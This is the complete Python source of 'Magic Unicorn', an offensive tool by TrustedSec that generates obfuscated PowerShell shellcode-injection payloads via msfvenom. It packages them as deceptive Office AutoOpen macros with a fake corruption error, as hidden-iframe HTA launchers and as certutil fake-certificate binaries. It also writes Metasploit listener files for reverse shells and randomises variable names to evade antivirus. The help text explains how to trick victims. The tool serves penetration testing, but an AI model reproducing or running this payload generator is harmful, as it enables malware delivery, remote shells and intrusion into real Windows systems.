#!/usr/bin/python
#
# Magic Unicorn - PowerShell downgrade attack and exploitation tool
#
# Written by: Dave Kennedy (@HackingDave)
# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
#
# Real quick down and dirty for native x86 powershell on any platform
#
# Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro>
# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
# Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
# HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
#
# Requirements: Need to have Metasploit installed.
#
# Special thanks to Matthew Graeber and Josh Kelley
#
import base64
import re
import subprocess
import sys
import os
import shutil
import random
import string

#
# generate a random string
#
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])

# needed for color in unicorn eyes
class ColorsEnum:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'


# display unicorn banner
def gen_unicorn():
    print(r"""
                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |""" + ColorsEnum.RED + r"""\)\ """ + ColorsEnum.ENDC + r""") """ + ColorsEnum.RED + r"""/(/""" + ColorsEnum.ENDC + r"""|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:
                """)


# display macro help
def macro_help():
    print("""
[*******************************************************************************************************]

				-----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
that, you will have a developer tab. Create a new macro, call it AutoOpen and paste the generated code
into that. This will automatically run. Note that a message will prompt to the user saying that the file
is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
victim to thinking the excel document is corrupted. You should get a shell through powershell injection
after that.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
HAPPEN!

[*******************************************************************************************************]

	""")


# display hta help
def hta_help():
    print("""
[*******************************************************************************************************]

				-----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to
use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work
properly.

[*******************************************************************************************************]

	""")


# display powershell help
def ps_help():
    print("""
[********************************************************************************************************]

				-----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains all
of the code needed in order to inject the powershell attack into memory. Note you will need a place that
supports remote command injection of some sort. Often times this could be through an excel/word  doc or
through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to
where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt
window or where you have the ability to call the powershell executable and it will give a shell back to
you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter
payloads.

Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************]
	""")


# display cert help
def cert_help():
    print("""
[*******************************************************************************************************]

				-----CERUTIL Attack Instruction----

The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
machine through a fake certificate file. To use this attack, simply place an executable in the path of
unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
windows machine to convert it back to a binary.

[*******************************************************************************************************]
	""")


def custom_ps1_help():
    print("""
[*******************************************************************************************************]

				-----Custom PS1 Attack Instructions----

This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.

Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.

Examples:

python unicorn.py harmless.ps1
python unicorn.py myfile.ps1 macro
python unicorn.py muahahaha.ps1 macro 500

The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.

[*******************************************************************************************************]
	""")


# usage banner
def gen_usage():
    print("-------------------- Magic Unicorn Attack Vector v2.3.3-----------------------------")
    print("\nNative x86 powershell injection attacks on any Windows platform.")
    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
    print("Twitter: @TrustedSec, @HackingDave")
    print("Credits: Matthew Graeber, Justin Elze, Chris Gates")
    print("\nHappy Magic Unicorns.")
    print("")
    print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
    print("PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443")
    print("PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe")
    print("Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro")
    print("HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta")
    print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
    print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
    print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
    print("Help Menu: python unicorn.py --help\n")


# split string
def split_str(s, length):
    return [s[i:i + length] for i in range(0, len(s), length)]


# write a file to designated path
def write_file(path, text):
    file_write = file(path, "w")
    file_write.write(text)
    file_write.close()


# generate full macro
def generate_macro(full_attack, line_length=380):
    # start of the macro
    macro_str = "Sub AutoOpen()\nDim x\nx = "

    if line_length is None:
        line_length_int = 380
    else:
        line_length_int = int(line_length)

    powershell_command_list = split_str(full_attack, line_length_int)

    for line in powershell_command_list:
        macro_str += "& \"" + line + "\" _\n"

    # remove trailing "_ \r\n"
    macro_str = macro_str[:-4]
    # remove first occurrence of &
    macro_str = macro_str.replace("& ", "", 1)
    macro_str = macro_str.replace("powershell -window", "-window")

    # end of macro
    macro_str += """"\nShell ("powershell.exe " & x)\nDim title As String\ntitle = "Critical Microsoft Office Error"\nDim msg As String\nDim intResponse As Integer\nmsg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
    return macro_str


# generate Matthew Graeber's (Matt rocks) attack for binary to cert format
# - https://gist.github.com/mattifestation/47f9e8a431f96a266522
def gen_cert_attack(filename):
    if os.path.isfile(filename):
        # make sure the directory is made
        if not os.path.isdir("decode_attack"):
            os.makedirs("decode_attack")

        # remove old files here
        if os.path.isfile("decode_attack/encoded_attack.crt"):
            os.remove("decode_attack/encoded_attack.crt")

        print("[*] Importing in binary file to base64 encode it for certutil prep.")
        data = file(filename, "rb").read()
        data = base64.b64encode(data)
        print("[*] Writing out the file to decode_attack/encoded_attack.crt")
        write_file("decode_attack/encoded_attack.crt",
                   "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
        print("[*] Filewrite complete, writing out decode string for you..")
        write_file("decode_attack/decode_command.bat",
                   "certutil -decode encoded_attack.crt encoded.exe")
        print("[*] Exported attack under decode_attack/")
        print("[*] There are two files, encoded_attack.crt contains your encoded data")
        print("[*] The second file, decode_command.bat will decode the cert to an executable.")
    else:
        print("[!] File was not found. Exiting the unicorn attack.")
        sys.exit()

        # generate HTA attack method


def gen_hta_attack(command):
    # HTA code here
    main1 = """<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % command
    main2 = """<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""

    # make a directory if its not there
    if not os.path.isdir("hta_attack"):
        os.makedirs("hta_attack")

    # write out index file
    print("[*] Writing out index file to hta_attack/index.html")
    write_file("hta_attack/index.html", main2)

    # write out Launcher.hta
    print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
    write_file("hta_attack/Launcher.hta", main1)


# generate the actual shellcode through msf
def generate_shellcode(payload, ipaddr, port):
    print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
    port = port.replace("LPORT=", "")

    # if we are using traditional payloads and not download_eec
    if not "exe=" in ipaddr:
       ipaddr = "LHOST=%s" % (ipaddr)
       port = "LPORT=%s" % (port)

    proc = subprocess.Popen(
        "msfvenom -p %s %s %s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
            payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '',
             'unsignedcharbuf[]=': ''}
    data = reduce(lambda a, kv: a.replace(*kv),
                  iter(repls.items()), data).rstrip()
    return data

# generate shellcode attack and replace hex
def gen_shellcode_attack(payload, ipaddr, port):
    # regular payload generation stuff
    # generate our shellcode first
    shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
    # sub in \x for 0x
    shellcode = re.sub("\\\\x", "0x", shellcode)
    # base counter
    counter = 0
    # count every four characters then trigger floater and write out data
    floater = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        floater += line
        counter += 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    # here's our shellcode prepped and ready to go
    shellcode = newdata[:-1]

    # write out rc file
    write_file("unicorn.rc",
               "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (
                   payload, ipaddr, port))

    # added random vars before and after to change strings - AV you are seriously ridiculous.
    var1 = generate_random_string(3, 4)
    var2 = generate_random_string(3, 4)
    var3 = generate_random_string(3, 4)
    var4 = generate_random_string(3, 4)
    var5 = generate_random_string(3, 4)
    var6 = generate_random_string(3, 4)

    # one line shellcode injection with native x86 shellcode
    powershell_code = (
        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)

    # run it through a lame var replace
    powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)

    return powershell_code


def gen_ps1_attack(ps1path):
    if os.path.isfile(ps1path):
        with open(ps1path, 'r') as scriptfile:
            data = scriptfile.read()
            return data
    else:
        print("[!] {0} does not exist. Please check your path".format(ps1path))
        sys.exit(1)


def format_payload(powershell_code, attack_type, attack_modifier, option):
    gen_unicorn()
    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
    print("Twitter: @TrustedSec, @HackingDave")
    print("\nHappy Magic Unicorns.")

    full_attack = "powershell -window hidden -EncodedCommand " + \
        base64.b64encode(powershell_code.encode('utf_16_le'))

    if attack_type == "msf":
        if attack_modifier == "macro":
            macro_attack = generate_macro(full_attack)
            write_file("powershell_attack.txt", macro_attack)
            macro_help()

        elif attack_modifier == "hta":
            gen_hta_attack(full_attack)
            # move unicorn to hta attack if hta specified
            shutil.move("unicorn.rc", "hta_attack/")
            hta_help()

        else:  # write out powershell attacks
            write_file("powershell_attack.txt", full_attack)
            ps_help()

    elif attack_type == "custom_ps1":
        if attack_modifier == "macro":
            macro_attack = generate_macro(full_attack, option)
            write_file("powershell_attack.txt", macro_attack)
        else:
            write_file("powershell_attack.txt", full_attack)

        custom_ps1_help()

    else:
        write_file("powershell_attack.txt", full_attack)
        ps_help()

    # Print completion messages
    if attack_type == "msf" and attack_modifier == "hta":
        print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
        print("[*] Run msfconosle -r unicorn.rc to launch listener and move index and launcher to web server.\n")

    elif attack_type == "msf":
        print("[*] Exported powershell output code to powershell_attack.txt.")
        print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\n")

    elif attack_type == "custom_ps1":
        print("[*] Exported powershell output code to powershell_attack.txt")


# pull the variables needed for usage
try:
    attack_type = ""
    attack_modifier = ""
    payload = ""
    ps1path = ""

    if len(sys.argv) > 1:
        if sys.argv[1] == "--help":
            ps_help()
            macro_help()
            hta_help()
            cert_help()
            custom_ps1_help()
            gen_usage()
            sys.exit()
        else:
            if len(sys.argv) > 2 and sys.argv[2] == "crt":
                attack_type = "crt"
                payload = sys.argv[1]
            elif re.search('\.ps1$', sys.argv[1]) is not None:
                attack_type = "custom_ps1"
                ps1path = sys.argv[1]
            else:
                attack_type = "msf"
                payload = sys.argv[1]

    # if we are using macros
    if len(sys.argv) == 5:
        if attack_type == "msf":  # msf macro attack
            ipaddr = sys.argv[2]
            port = sys.argv[3]
            attack_modifier = sys.argv[4]
            ps = gen_shellcode_attack(payload, ipaddr, port)
        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit(1)

        format_payload(ps, attack_type, attack_modifier, None)

    # default unicorn & custom ps1 macro attacks
    elif len(sys.argv) == 4:
        if attack_type == "custom_ps1":  # custom ps1 macro attack
            attack_modifier = sys.argv[2]
            option = sys.argv[3]
            ps = gen_ps1_attack(ps1path)
        elif attack_type == "msf":
            payload = sys.argv[1]
            ipaddr = sys.argv[2]
            port = sys.argv[3]
            attack_modifier = ""
            option = None
            ps = gen_shellcode_attack(payload, ipaddr, port)
        # It should not be possible to get here, but just in case it does for some reason in the future, it will
        # prevent usage of 'ps' and 'option', causing the app to crash
        else:
            print("[!] Something went way wrong while generating payload.")
            sys.exit()

        format_payload(ps, attack_type, attack_modifier, option)

    elif len(sys.argv) == 3:
        # Matthews base64 cert attack
        if attack_type == "crt":
            cert_help()
            # generate the attack vector
            gen_cert_attack(payload)
        elif attack_type == "custom_ps1":
            attack_modifier = sys.argv[2]
            ps = gen_ps1_attack(ps1path)
            format_payload(ps, attack_type, attack_modifier, None)
        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit()

    elif len(sys.argv) == 2:
        if attack_type == "custom_ps1":
            ps = gen_ps1_attack(ps1path)
            format_payload(ps, attack_type, None, None)
        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit()

    # if we did supply parameters
    elif len(sys.argv) < 2:
        gen_unicorn()
        gen_usage()

except Exception as e:
    print("[!] Something went wrong, printing the error: " + str(e))
